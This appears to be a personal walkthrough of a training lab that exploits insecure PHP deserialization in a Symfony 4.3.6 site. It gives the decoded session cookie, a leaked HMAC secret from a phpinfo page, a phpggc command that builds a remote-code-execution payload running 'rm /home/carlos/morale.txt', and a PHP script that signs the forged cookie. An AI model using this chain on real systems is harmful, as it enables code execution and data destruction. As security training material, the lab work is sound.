This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. 
Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. 
Then, work out how to generate a valid signed cookie containing your malicious object. 
Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.



Originally notcied the cookie was this:
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJidjZ0MmIyaGp1cnh6MTJxOXk4ZzZuZ2JueHR4amR1MSI7fQ%3
D%3D%22%2C%22sig_hmac_sha1%22%3A%22ad0ab653cd1b4c778606a6d7e24baee4f9231213%22%7D

which URL decodes to:
{
    "token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJidjZ0MmIyaGp1cnh6MTJxOXk4ZzZuZ2JueHR4amR1MSI7fQ==",
    "sig_hmac_sha1":"ad0ab653cd1b4c778606a6d7e24baee4f9231213"
}

the token part of this actually base64 decoeds further to give:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bv6t2b2hjurxz12q9y8g6ngbnxtxjdu1";}


this is clearly a php object, modifyting this gives an internal 500 error with the error message of:
Internal Server Error: Symfony Version: 4.3.6

this gives us info that the server is using Symfony Version 4.3.6.



Looking at the sitemap the following php file was picked up:
GET /cgi-bin/phpinfo.php HTTP/2

this was a basic php info file about the server, in this containted the SECRET_KEY of "n11g4lt2cdrew1zqqngaha372jf6cuz8"



having all this info we can put this into the third party tool phpggc, using the following command:
./phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" | base64


this gives us the token part needed in the arbitrary cookie, however the signiture part of this still needs to be solved to pass into the server.


to do this I used the script of:
<?php
$object = 
"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "n11g4lt2cdrew1zqqngaha372jf6cuz8";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>


which takes the secret key we found, and the phpggc object we had generated for the arbitrary command of removing the morale.txt file.
This then generates the signiture for this using HMAC-SHA1 hashing algorithm. Then outputting the cookie to solve the lab.


then sending this cookie solves the lab by deleting the morale.txt file on carlos' home directory.
